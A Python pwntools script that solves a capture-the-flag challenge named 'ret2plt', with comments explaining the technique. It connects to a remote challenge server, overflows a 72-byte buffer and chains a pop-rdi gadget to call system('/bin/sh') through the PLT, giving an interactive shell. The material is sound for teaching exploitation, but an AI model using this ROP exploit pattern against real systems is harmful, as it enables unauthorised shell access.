#!/usr/bin/env python3
from pwn import *

#
 # RET2PLT exploitation
 #
 # This challenge is solvable using a ret2plt technique because the binary
 # already exposes the system() function in its PLT.
 #
 # Since system() is already dynamically linked and resolved through the PLT,
 # there is no need to leak libc or compute its base address.
 # We can directly call system("/bin/sh") by controlling the argument via ROP.
# 

p = remote("offsec.m0lecon.it", 13594)

context.binary = elf = ELF('./ret2plt', checksec=False)

OFFSET_TO_RIP = 72  # found via cyclic pattern

pop_rdi = elf.sym.pop_rdi_ret   # this challenge includes a helper symbol "pop_rdi_ret" to keep the first exercise simple
binsh = next(elf.search(b'/bin/sh\x00'))
ret = ROP(elf).find_gadget(['ret']).address

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret),              # for stack alignment
    p64(pop_rdi),          # prepare the argument for system()
    p64(binsh),            # address of "/bin/sh" string passed as argument to system()
    p64(elf.plt.system),   # call system() with "/bin/sh" as argument => system("/bin/sh") => spawn a shell
)

p.recvuntil(b'order?\n')
p.send(payload)
p.interactive()
